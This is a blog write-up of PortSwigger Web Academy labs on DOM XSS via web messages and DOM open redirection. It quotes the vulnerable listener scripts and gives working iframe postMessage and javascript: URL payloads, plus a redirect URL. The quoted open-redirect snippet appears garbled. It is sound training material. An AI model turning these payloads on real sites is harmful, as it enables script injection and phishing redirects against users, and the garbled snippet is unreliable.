---
title: (Portswigger/WebAcademy) - DOM-based Vulnerabilities
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-01-15 09:00:00 +0200
categories: [Web Application, DOM-based Vulnerabilities]
tags: [Notes, DOM-based Vulnerabilities, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the DOM-based Vulnerabilitiess.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/dom-based) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.

## TOC
- [Intro](#intro)
  - [TOC](#toc)
- [DOM XSS using web messages](#dom-xss-using-web-messages)
- [DOM XSS using web messages and a JavaScript URL](#dom-xss-using-web-messages-and-a-javascript-url)
- [DOM XSS using web messages and JSON.parse](#dom-xss-using-web-messages-and-jsonparse)
- [DOM-based open redirection](#dom-based-open-redirection)

# DOM XSS using web messages
> This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.

When we spin the lab, we'll notice weird `object` on the page and if we check the source code, this is the code that relates to it:

```js
window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;
})
```
![picture 0](/assets/images/602b1d4f7bce78fca20d659bd777e66cc52a1a779bfae0380c5c20b55f9ace96.png)  

To reach the sink, we'll need to use `postMessage` method and we can do that by using an iFrame.

This is the payload that will be delivered to the victim:

```html
<iframe src="https://0aea00d403ec1405801edaa10086001b.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

Keep in mind that `postManage` can be sent between different windows and/or iframes.

# DOM XSS using web messages and a JavaScript URL
> This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

Next lab looks like the previous one, only we are dealing with different vulnerable script:

```js
window.addEventListener('message', function(e) {
  var url = e.data;
  if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
    location.href = url;
  }
}, false);
```

Payload:
```html
<iframe src="https://0ad6001e03db14e280f0e957004a00cc.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

Once the iframe finishes loading, it utilizes the `postMessage()` method to transmit the JavaScript payload to the main page. An event listener identifies the "http:" string within the payload and forwards the payload to the `location.href` sink. At this point, the `print()` function is invoked.

# DOM XSS using web messages and JSON.parse
> This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

This lab makes use of following script in the body:

```js
window.addEventListener('message', function(e) {
  var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
  document.body.appendChild(iframe);
    try {
      d = JSON.parse(e.data);
    } catch(e) {
      return;
    }
    switch(d.type) {
      case "page-load":
        ACMEplayer.element.scrollIntoView();
        break;
      case "load-channel":
        ACMEplayer.element.src = d.url;
        break;
      case "player-height-changed":
        ACMEplayer.element.style.width = d.width + "px";
        ACMEplayer.element.style.height = d.height + "px";
        break;
    }
}, false);
```

This script creates an `iFrame` if `postMessage` is recieved, and runs the message through `JSON.parse`. 

Payload:
```html
<iframe src=https://0aab009a03752c238500be2300570002.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

When the ‘load-channel’ case is triggered in the switch statement, the URL from the received message is set as the source for the iframe. However, in this scenario, the URL in the message actually carries our JavaScript payload.

# DOM-based open redirection
> This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

This lab allows adding comments to posts. Button appears with following code:

```html
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```
The `url` parameter is vulnerable and will take the victim to any url.

Payload:
```
https://0a24004903b65f7a82b847bd00d20037.web-security-academy.net/post?postId=10&url=https://exploit-0ace00f503b15fdc8293465c01d700fd.exploit-server.net/
```